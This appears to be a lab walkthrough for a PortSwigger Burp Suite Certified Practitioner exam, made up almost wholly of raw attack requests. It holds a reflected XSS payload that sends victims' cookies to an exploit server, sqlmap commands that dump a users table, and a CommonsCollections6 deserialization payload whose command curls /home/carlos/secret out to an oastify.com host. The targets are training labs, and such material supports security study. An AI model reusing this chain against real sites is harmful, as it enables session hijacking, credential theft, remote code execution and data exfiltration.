## exploit cookie
xss","test":alert(window["document"]["cookie"])}//

-----------------------------------------------------------------------------------------------------------

## Stage 1: Access any user account.
```
GET /?SearchTerm=%22-alert%281%29-%22 HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=Rl7IRjon3MrSdJCj30NOFul6wsytGWHa

GET /search_res?SearchTerm=%22-alert%281%29-%22 HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=Rl7IRjon3MrSdJCj30NOFul6wsytGWHa

POST / HTTP/1.1
Host: exploit-ace81f7f1f46c738c0bf018a01830074.web-security-academy.net

urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Cscript%3E%0D%0Alocation%3D%27https%3A%2F%2Fac351fcc1f7cc747c0be0124004c0005.web-security-academy.net%2F%3FSearchTerm%3D%2522%252d%2528%2577%2569%256e%2564%256f%2577%255b%2522%2564%256f%2563%2575%256d%2565%256e%2574%2522%255d%255b%2522%256c%256f%2563%2561%2574%2569%256f%256e%2522%255d%253d%2522%2568%2574%2574%2570%2573%253a%252f%252f%2565%2578%2570%256c%256f%2569%2574%252d%2561%2563%2565%2538%2531%2566%2537%2566%2531%2566%2534%2536%2563%2537%2533%2538%2563%2530%2562%2566%2530%2531%2538%2561%2530%2531%2538%2533%2530%2530%2537%2534%2525%2532%2565%2577%2565%2562%252d%2573%2565%2563%2575%2572%2569%2574%2579%252d%2561%2563%2561%2564%2565%256d%2579%2525%2532%2565%256e%2565%2574%252f%253f%2522%252b%2577%2569%256e%2564%256f%2577%255b%2522%2564%256f%2563%2575%256d%2565%256e%2574%2522%255d%255b%2522%2563%256f%256f%256b%2569%2565%2522%255d%2529%252d%2522%27%3B%0D%0A%3C%2Fscript%3E&formAction=STORE

POST / HTTP/1.1
Host: exploit-ace81f7f1f46c738c0bf018a01830074.web-security-academy.net

urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Cscript%3E%0D%0Alocation%3D%27https%3A%2F%2Fac351fcc1f7cc747c0be0124004c0005.web-security-academy.net%2F%3FSearchTerm%3D%2522%252d%2528%2577%2569%256e%2564%256f%2577%255b%2522%2564%256f%2563%2575%256d%2565%256e%2574%2522%255d%255b%2522%256c%256f%2563%2561%2574%2569%256f%256e%2522%255d%253d%2522%2568%2574%2574%2570%2573%253a%252f%252f%2565%2578%2570%256c%256f%2569%2574%252d%2561%2563%2565%2538%2531%2566%2537%2566%2531%2566%2534%2536%2563%2537%2533%2538%2563%2530%2562%2566%2530%2531%2538%2561%2530%2531%2538%2533%2530%2530%2537%2534%2525%2532%2565%2577%2565%2562%252d%2573%2565%2563%2575%2572%2569%2574%2579%252d%2561%2563%2561%2564%2565%256d%2579%2525%2532%2565%256e%2565%2574%252f%253f%2522%252b%2577%2569%256e%2564%256f%2577%255b%2522%2564%256f%2563%2575%256d%2565%256e%2574%2522%255d%255b%2522%2563%256f%256f%256b%2569%2565%2522%255d%2529%252d%2522%27%3B%0D%0A%3C%2Fscript%3E&formAction=DELIVER_TO_VICTIM

GET /deliver-to-victim HTTP/1.1
Host: exploit-ace81f7f1f46c738c0bf018a01830074.web-security-academy.net

POST / HTTP/1.1
Host: exploit-ace81f7f1f46c738c0bf018a01830074.web-security-academy.net

urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Cscript%3E%0D%0Alocation%3D%27https%3A%2F%2Fac351fcc1f7cc747c0be0124004c0005.web-security-academy.net%2F%3FSearchTerm%3D%2522%252d%2528%2577%2569%256e%2564%256f%2577%255b%2522%2564%256f%2563%2575%256d%2565%256e%2574%2522%255d%255b%2522%256c%256f%2563%2561%2574%2569%256f%256e%2522%255d%253d%2522%2568%2574%2574%2570%2573%253a%252f%252f%2565%2578%2570%256c%256f%2569%2574%252d%2561%2563%2565%2538%2531%2566%2537%2566%2531%2566%2534%2536%2563%2537%2533%2538%2563%2530%2562%2566%2530%2531%2538%2561%2530%2531%2538%2533%2530%2530%2537%2534%2525%2532%2565%2577%2565%2562%252d%2573%2565%2563%2575%2572%2569%2574%2579%252d%2561%2563%2561%2564%2565%256d%2579%2525%2532%2565%256e%2565%2574%252f%253f%2522%252b%2577%2569%256e%2564%256f%2577%255b%2522%2564%256f%2563%2575%256d%2565%256e%2574%2522%255d%255b%2522%2563%256f%256f%256b%2569%2565%2522%255d%2529%252d%2522%27%3B%0D%0A%3C%2Fscript%3E&formAction=ACCESS_LOG

GET /log HTTP/1.1
Host: exploit-ace81f7f1f46c738c0bf018a01830074.web-security-academy.net
```

## Stage 2: Use your user account to access the admin interface at /admin, perhaps by elevating your privileges or compromising the administrator account.
```
GET /filtered_search HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=8lPa91gU2zM8vrOSbZCHm26sMfiFxaxX

GET /filtered_search?SearchTerm=aaaaa&sort-by=DATES&writer= HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=8lPa91gU2zM8vrOSbZCHm26sMfiFxaxX

$ sqlmap -u "https://ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net/filtered_search?SearchTerm=aaaaa&sort-by=*&writer=" --cookie="_lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=8lPa91gU2zM8vrOSbZCHm26sMfiFxaxX" --batch --random-agent -v --level=2

$ sqlmap -u "https://ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net/filtered_search?SearchTerm=aaaaa&sort-by=*&writer=" --cookie="_lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=8lPa91gU2zM8vrOSbZCHm26sMfiFxaxX" --batch --random-agent -v --level=2 --tables

$ sqlmap -u "https://ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net/filtered_search?SearchTerm=aaaaa&sort-by=*&writer=" --cookie="_lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=8lPa91gU2zM8vrOSbZCHm26sMfiFxaxX" --batch --random-agent -v --level=2 -T users --dump

POST /log_in HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=Rl7IRjon3MrSdJCj30NOFul6wsytGWHa

csrf=c4uF2hSQBAZvqWt2hD9hIAPWzsQjY53K&username=administrator&password=b9v9whchewypewtl1ygv

GET /my-account HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk

GET /admin-panel HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk

GET /admin-panel HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: admin-prefs=H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d; _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk
```

## Stage 3: Use the admin interface to read the contents of /home/carlos/secret from the server's filesystem, and submit it using "submit solution".
```
GET /admin-panel HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: admin-prefs=§H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d§; _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk

CommonsCollections6 'host 7u2jk4i1vg2e3g5p6fxru8hmqdw3ks.oastify.com'

GET /admin-panel HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: admin-prefs=§H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d§; _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk

CommonsCollections6 'curl -d @/home/carlos/secret gi2s8d6ajpqnrptyuol0ih5vemke83.oastify.com'

POST /submitSolution HTTP/1.1
Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
Cookie: _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk

- The answer will be encrypted.
answer=y1schUR0z7Z9dbqLfwX4rmZFd8NnVc4pJfU3tvhqzwc=
```
![](https://github.com/nu11secur1ty/PortSwigger-Web-Security-Academy/blob/main/Burp-Suite-Certified-Practitioner/docs/Certified-Practitioner.gif)
